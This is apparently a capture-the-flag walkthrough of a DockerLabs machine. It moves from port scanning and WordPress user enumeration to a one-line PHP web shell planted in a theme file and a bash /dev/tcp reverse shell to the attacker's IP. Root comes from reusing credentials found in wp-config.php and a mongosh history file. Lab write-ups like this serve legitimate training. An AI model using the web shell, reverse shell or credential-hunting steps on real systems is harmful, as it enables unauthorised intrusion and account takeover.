Difficulty: **medium**
Made by: **El pinguino de mario**

---
# Steps to pwn
---

First of all, we make sure the machine is up, we can check it out quickly with the command **ping**

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/collections]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.247 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.146 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.098 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2040ms
rtt min/avg/max/mdev = 0.098/0.163/0.247/0.062 ms
```

Now we can start the phase of **reconnaissance**

---
# Reconnaissance

We start to do a scan with nmap to discover what ports are open to the machine.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/collections]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 20:40 -05
Initiating ARP Ping Scan at 20:40
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 20:40, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 20:40
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 27017/tcp on 172.17.0.2
Completed SYN Stealth Scan at 20:40, 3.01s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000026s latency).
Scanned at 2025-11-06 20:40:49 -05 for 3s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 64
80/tcp    open  http    syn-ack ttl 64
27017/tcp open  mongod  syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.38 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

When the scan concludes we see 3 ports open:

- port 22 ssh (secure shell)
- port 80 http (hyper-text transfer protocol)
- port 27017 mongod (this it seems a database with mongoDB)

We want to search more deeply about these ports.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/collections]
└─$ nmap -p22,80,27017 -sCV 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 22:35 -05
Nmap scan report for 172.17.0.2
Host is up (0.00010s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 25:3f:a6:b3:1b:a8:dc:e6:ef:0a:51:a7:d6:f4:15:c9 (ECDSA)
|_  256 d1:38:83:b2:33:0d:ad:b6:44:4f:b5:6e:fb:17:08:9f (ED25519)
80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
27017/tcp open  mongodb MongoDB 7.0.9 6.1 or later
| mongodb-databases: 
|   errmsg = Unsupported OP_QUERY command: listDatabases. The client driver may require an upgrade. For more details see https://dochub.mongodb.org/core/legacy-opcode-removal
|   code = 352
|   ok = 0.0
|_  codeName = UnsupportedOpQueryCommand
| mongodb-info: 
|   MongoDB Build info
|     version = 7.0.9
|     modules
|     javascriptEngine = mozjs
|     sysInfo = deprecated
|     ok = 1.0
|     openssl
|       running = OpenSSL 3.0.2 15 Mar 2022
|       compiled = OpenSSL 3.0.2 15 Mar 2022
|     buildEnvironment
|       target_arch = x86_64
|       linkflags = -Wl,--fatal-warnings -B/opt/mongodbtoolchain/v4/bin -gdwarf-5 -pthread -Wl,-z,now -fuse-ld=lld -fstack-protector-strong -gdwarf64 -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro -Wl,--compress-debug-sections=none -Wl,-z,origin -Wl,--enable-new-dtags
|       target_os = linux
|       cxx = /opt/mongodbtoolchain/v4/bin/g++: g++ (GCC) 11.3.0
|       cxxflags = -Woverloaded-virtual -Wpessimizing-move -Wno-maybe-uninitialized -fsized-deallocation -Wno-deprecated -std=c++20
|       distarch = x86_64
|       distmod = ubuntu2204
|       cppdefines = SAFEINT_USE_INTRINSICS 0 PCRE2_STATIC NDEBUG _XOPEN_SOURCE 700 _GNU_SOURCE _FORTIFY_SOURCE 2 ABSL_FORCE_ALIGNED_ACCESS BOOST_ENABLE_ASSERT_DEBUG_HANDLER BOOST_FILESYSTEM_NO_CXX20_ATOMIC_REF BOOST_LOG_NO_SHORTHAND_NAMES BOOST_LOG_USE_NATIVE_SYSLOG BOOST_LOG_WITHOUT_THREAD_ATTR BOOST_MATH_NO_LONG_DOUBLE_MATH_FUNCTIONS BOOST_SYSTEM_NO_DEPRECATED BOOST_THREAD_USES_DATETIME BOOST_THREAD_VERSION 5
|       cc = /opt/mongodbtoolchain/v4/bin/gcc: gcc (GCC) 11.3.0
|       ccflags = -Werror -include mongo/platform/basic.h -ffp-contract=off -fasynchronous-unwind-tables -g2 -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -gdwarf-5 -fno-omit-frame-pointer -fno-strict-aliasing -O2 -march=sandybridge -mtune=generic -mprefer-vector-width=128 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-const-variable -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -gdwarf64 -Wa,--nocompress-debug-sections -fno-builtin-memcmp -Wimplicit-fallthrough=5
|     gitVersion = 3ff3a3925c36ed277cf5eafca5495f2e3728dd67
|     versionArray
|       3 = 0
|       0 = 7
|       1 = 0
|       2 = 9
|     storageEngines
|       1 = wiredTiger
|       0 = devnull
|     maxBsonObjectSize = 16777216
|     debug = false
|     bits = 64
|     allocator = tcmalloc
|   Server status
|     errmsg = Unsupported OP_QUERY command: serverStatus. The client driver may require an upgrade. For more details see https://dochub.mongodb.org/core/legacy-opcode-removal
|     code = 352
|     ok = 0.0
|_    codeName = UnsupportedOpQueryCommand
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.56 seconds
```

**-p22,80,27017** <- With this argument nmap will only scan this 3 ports that we type.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

After this scan finish, we can get a lot of info from mongoDB, but it don't have something interesting.

We can try to find more about the website with **whatweb** to find out what possible technologies uses.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/collections]
└─$ whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[172.17.0.2], Title[Apache2 Ubuntu Default Page: It works]
```

We see the default page of ubuntu and nothing else more interesting. So we can start the phase of **enumeration.**

---
# Enumeration

We can enumerate through the website if we can found something interesting on it, we can do this with a lot of tools, I mainly use gobuster, it's easy to use and it's fast.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/collections]
└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,js,html
```

**dir** <- With this argument we make a enumeration of directories with the website.

**-u** <- With this argument we select the target to enumerate.

**-w** <- With this argument we select the dictionary to apply to the enumeration.

**-x** <- With this argument we can also add a extension per each payload, you can also enumerate this type of extensions like: php, py, txt, js, html and much more. But if you add more extentions it will take more longer to finish the enumeration.

![[Pasted image 20251106231210.png]]

And we can see here the directory **/wordpress** it seems this website uses wordpress, let's take a look with the browser.

![[Pasted image 20251106232718.png]]

It seems that the website it's broken, let's take a look into the source code of the page.

```
<title>Mi Web Maravillosa</title>
<link rel='dns-prefetch' href='//collections.dl' />
```

virtual hosting, so we need to put this line inside of the **/etc/hosts** file:

```
172.17.0.2      collections.dl
```

Now we refresh the website and it's fixed.

There is a tool that we can enumerate a website if it's made with wordpress, the tool is **wpscan** so then we are going to use this tool in this case.

Before doing this we make sure wpscan is properly updated:

```
wpscan --update
```

Now we can start the enumeration with wpscan:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/collections]
└─$ wpscan --url http://collections.dl/wordpress --detection-mode aggressive -e ap,at,u
```

**--detection-mode** <- With this argument the tool are going the scan whatever you want to be, the available ones are: aggressive, pasive, default. In this case we are using the aggressive mode.

**-e ap,at,u** <- With this argument the tool are going to enumerate **all themes (at), all plugins (ap) and also enumerate all the users (u)**, also we can enumerate possible vulnerable themes and vulnerable plugins (vp, vt)

And we get this:

```
[i] User(s) Identified:

[+] chocolate
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://collections.dl/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Sitemap (Aggressive Detection)
 |   - http://collections.dl/wordpress/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

We got a user, we can try if his username can also be his password too.

We go to: http://collections.dl/wordpress/wp-admin

We enter the credentials... And we got success!

the credentials are: chocolate:chocolate

and we can begin the **exploitation** phase

---
# Exploitation

we go here to the next part:

![[Pasted image 20251107203953.png]]

![[Pasted image 20251107204236.png]]

And we select the **twenty twenty-three** theme and we click select.

![[Pasted image 20251107204438.png]]

We click **patterns**, and I personally use **hidden-404.php**, to insert the next code:

```
system($_GET["cmd"]);
```

With this code we are making a web shell, to be able to make commands on the website.

and once this we click **Update file.**

Them we go to the next path with the browser: 

```
http://collections.dl/wordpress/wp-content/themes/twentytwentythree/patterns/hidden-404.php
```


and we see this:

![[Pasted image 20251107210356.png]]

this is because we make the request incorrectly, then we do the next request:

```
hidden-404.php?cmd=whoami
```

and we can see this:

![[Pasted image 20251107211418.png]]

then we can make a **reverse shell** with the next one liner:

- **bash -c 'bash -i >%26 /dev/tcp/{attacker's ip}/{port} 0>%261'**

this one liner it executes bash and makes a shell interactive and the traffic will reach us to our ip address and the port that we are in **listening**, you might be wondering what it's that thing **%26** ?

This is the url encoded version of the symbol **ampersand** (&), sometimes when we do a request to a website, needs to be encoded in this format, to receive it correctly the request.

Before we make this request we must be in **listening** with netcat:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/domain]
└─$ nc -lvnp {PORT}
listening on [any] {PORT} ...
```

**-l**  <- This argument makes to netcat to be in mode listening.

**-v** <- This argument activates the **verbose** mode, this will show us in more detail the connection that we receive.

**-n** <- This makes to netcat to skip the DNS lookup, and only uses the IP address directly.

**-p** <- The port we are in listening, can be any, if it's not being currently used.

Then we launch the command waiting for our connection with the reverse shell.

And finally we make our request in the browser to establish the connection with our terminal.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/collections]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.0.20] from (UNKNOWN) [172.17.0.2] 42552
bash: cannot set terminal process group (281): Inappropriate ioctl for device
bash: no job control in this shell
<ress/wp-content/themes/twentytwentythree/patterns$ whoami
whoami
www-data
<ress/wp-content/themes/twentytwentythree/patterns$ 
```

And finally we are in into the machine.

We can make some treatment of the tty to make this reverse shell more comfortable to be with.

First of all we do this:

```
www-data@7f02c47512a2:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

This command makes a new bash session with **script** and **/dev/null** asthe output file, because script register every command we execute in a log, but with /dev/null path, we make that log can't record commands, and **-c bash** makes script to run the shell with bash.

We do this because we want to use CTRL + C and more functions of the bash.

When we execute this, we suspend our reverse shell for a moment.

then we execute the next command in our attack machine:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/domain]
└─$ stty raw -echo; fg
```

This command does that stty will treat the terminal.

**raw** <- With raw we are making all the data of output and input to be as raw.

**-echo** <- With this we are making that if we execute a command it will not be printed again in the output.

**; fg** <- And with this we resume our reverse shell again.

When we execute this command we reset the xterm:

```
reset xterm
```

This are going to reset the terminal.

If we want to clear our terminal we can't because the term it gonna be different of the xterm, that it have this function. we can do this in the next way to be able to clear our screen if it get nasty:

```
www-data@7f02c47512a2:/var/www/html$ export TERM=xterm
```

And one last thing, if we notice the display of the terminal is very tiny!

We can adjust this to be more bigger with the next command:

```
stty rows {num} columns {num}
```

and finally it looks way better!

if we go to the path of **/var/www/html/wordpress** sometimes we can see a file that's the **wp-config.php** file, we can get the username and the password of the database.

we can take a look.

and we see this:

```
/** Database username */
define( 'DB_USER', 'wordpressuser' );

/** Database password */
define( 'DB_PASSWORD', 't9sH76gpQ82UFeZ3GXZS' );

/** Acceso alternativo chocolate:estrella */
```

we got the credentials of the database. And also another credentials from the user **chocolate**, his password is **estrella** we can try if it works:

```
www-data@7aeac3cb6abe:/var/www/html/wordpress$ su chocolate
Password: 
chocolate@7aeac3cb6abe:/var/www/html/wordpress$ whoami
chocolate
```

And we can login with the user chocolate.

---
# Privilege Escalation

We go to the home directory of the user chocolate, and we can see this:

```
chocolate@ec3917eb1c6f:~$ ls -la
total 48
drwxr-x--- 1 chocolate chocolate 4096 Nov  8 02:58 .
drwxr-xr-x 1 root      root      4096 May 16  2024 ..
-rw------- 1 chocolate chocolate    5 May 16  2024 .bash_history
-rw-r--r-- 1 chocolate chocolate  220 May 16  2024 .bash_logout
-rw-r--r-- 1 chocolate chocolate 3771 May 16  2024 .bashrc
drwx------ 2 chocolate chocolate 4096 May 16  2024 .cache
drwxrwxr-x 3 chocolate chocolate 4096 Nov  8 02:58 .local
drwx------ 1 chocolate chocolate 4096 May 16  2024 .mongodb
-rw-r--r-- 1 chocolate chocolate  807 May 16  2024 .profile

```

we can see a hidden directory, **.mongodb**, we can take a look what's inside of it:

```
chocolate@ec3917eb1c6f:~/.mongodb$ ls
mongosh
```

We enter the directory **mongosh**, and we can see this:

```
chocolate@ec3917eb1c6f:~/.mongodb/mongosh$ ls
6645f1a68a091fae762202d7_log  config  mongosh_repl_history  snippets
```

we can see multiple files here, we can see what are his contents, but the interesting one is the repl history file.

we can see his content and we see this:

```
chocolate@ec3917eb1c6f:~/.mongodb/mongosh$ cat mongosh_repl_history 
show dbs
db.fsyncLock()
db.usuarios.insert({"usuario": "dbadmin", "contraseña": "chocolaterequetebueno123"})
use accesos
show dbs
```

we see the password of the user **dbadmin** and his password is: **chocolaterequetebueno123** let's see if this is valid:

```
chocolate@ec3917eb1c6f:~/.mongodb/mongosh$ su dbadmin
Password: 
dbadmin@ec3917eb1c6f:/home/chocolate/.mongodb/mongosh$ whoami
dbadmin
```

and we loggin as dbadmin.

after a looooooong enumeration, I try to enter this password with the user root and we hope it is...

```
dbadmin@ec3917eb1c6f:/$ su root
Password: 
root@ec3917eb1c6f:/# whoami
root
```

I am root now ***...pwned!...***
